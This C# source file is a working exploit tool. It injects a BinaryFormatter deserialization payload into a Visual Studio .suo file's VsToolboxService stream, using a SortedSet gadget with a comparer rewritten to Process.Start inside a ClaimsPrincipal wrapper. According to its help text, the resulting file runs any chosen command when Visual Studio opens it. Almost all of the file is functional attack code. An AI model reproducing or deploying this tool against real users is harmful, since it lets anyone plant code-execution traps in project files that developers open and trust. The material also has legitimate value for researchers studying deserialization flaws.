
using OpenMcdf;
using suo_exploit_test.Helpers.ModifiedVulnerableBinaryFormatters;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;


namespace suo_exploit_test
{
    class Program
    {
        public static byte[] InjectSuoFile(byte[] SuoFile, string cmdFileName, string cmdArguments = "") 
        {
            byte[] output;
            using (MemoryStream stream = new MemoryStream(SuoFile)) 
            {
                using (var compoundFile = new CompoundFile(stream))
                {
                    CFStream dataStream = compoundFile.RootStorage.GetStream("VsToolboxService");
                    byte[] deserializationPayload = CreateDeserializationPayload(cmdFileName, cmdArguments);
                    byte[] payload;
                    using (MemoryStream payloadStream = new MemoryStream()) 
                    {
                        BinaryWriter payloadWriter = new BinaryWriter(payloadStream);
                        payloadWriter.Write(1);
                        payloadWriter.Write("");
                        payloadWriter.Write(1);
                        payloadWriter.Write("");
                        payloadWriter.Write("");
                        payloadWriter.Write(deserializationPayload);
                        payload = payloadStream.ToArray();
                        payloadWriter.Close();
                        payloadWriter.Dispose();
                    }
                    dataStream.SetData(payload);
                    using (MemoryStream outputStream = new MemoryStream()) 
                    {
                        compoundFile.Save(outputStream);
                        output = outputStream.ToArray();
                    }
                }
            }
            return output;
        }
        public static byte[] CreateDeserializationPayload(string cmdFileName, string cmdArguments = "")
        {
            Delegate da = new Comparison<string>(String.Compare);
            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
            IComparer<string> comp = Comparer<string>.Create(d);
            SortedSet<string> set = new SortedSet<string>(comp);
            set.Add(cmdFileName);
            if (!string.IsNullOrEmpty(cmdArguments))
            {
                set.Add(cmdArguments);
            }
            else
            {
                set.Add("");
            }
            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = d.GetInvocationList();
            invoke_list[1] = new Func<string, string, Process>(Process.Start);
            fi.SetValue(d, invoke_list);
            MemoryStream stream = new MemoryStream();
            System.Runtime.Serialization.Formatters.Binary.BinaryFormatter fmt = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
            fmt.Serialize(stream, set);
            string b64encoded = Convert.ToBase64String(stream.ToArray());
            string payload_bf_json = @"[{'Id': 1,
    'Data': {
      '$type': 'SerializationHeaderRecord',
      'binaryFormatterMajorVersion': 1,
      'binaryFormatterMinorVersion': 0,
      'binaryHeaderEnum': 0,
      'topId': 1,
      'headerId': -1,
      'majorVersion': 1,
      'minorVersion': 0
}},{'Id': 2,
    'TypeName': 'ObjectWithMapTyped',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 4,
      'objectId': 1,
      'name': 'System.Security.Claims.ClaimsPrincipal',
      'numMembers': 1,
      'memberNames':['m_serializedClaimsIdentities'],
      'binaryTypeEnumA':[1],
      'typeInformationA':[null],
      'typeInformationB':[null],
      'memberAssemIds':[0],
      'assemId': 0
}},{'Id': 10,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 5,
      'value': '" + b64encoded + @"'
}},{'Id': 11,
    'TypeName': 'MessageEnd',
    'Data': {
      '$type': 'MessageEnd'
}}]";
            MemoryStream ms = AdvancedBinaryFormatterParser.JsonToStream(payload_bf_json);
            return ms.ToArray();
        }
        static void Main(string[] args)
        {
            if (args.Length < 3) 
            {
                ShowHelp();
                return;
            }

            string input = args[0];
            string output = args[1];
            string cmdFile = args[2];
            string extraArgs=string.Join(" ", args, 3, args.Length-3);
            byte[] data = InjectSuoFile(File.ReadAllBytes(input), cmdFile, extraArgs);
            File.WriteAllBytes(output, data);
            Console.WriteLine("Complete!");
            Console.WriteLine("Press enter to exit...");
            Console.ReadLine();
        }

        private static void ShowHelp()
        {
            Console.WriteLine("Usage: suo_exploit_test.exe input.suo output.suo command [optional args]");
            Console.WriteLine();
            Console.WriteLine("Examples:");
            Console.WriteLine("  suo_exploit_test.exe input.suo injected.suo calc");
            Console.WriteLine("  suo_exploit_test.exe input.suo injected.suo cmd /c start calc");
            Console.WriteLine();
            Console.WriteLine("The input.suo is an existing .suo for the program to modify");
            Console.WriteLine("The injected.suo is the output, thats the file which when open by visual studio's will run your command");
        }

    }
}
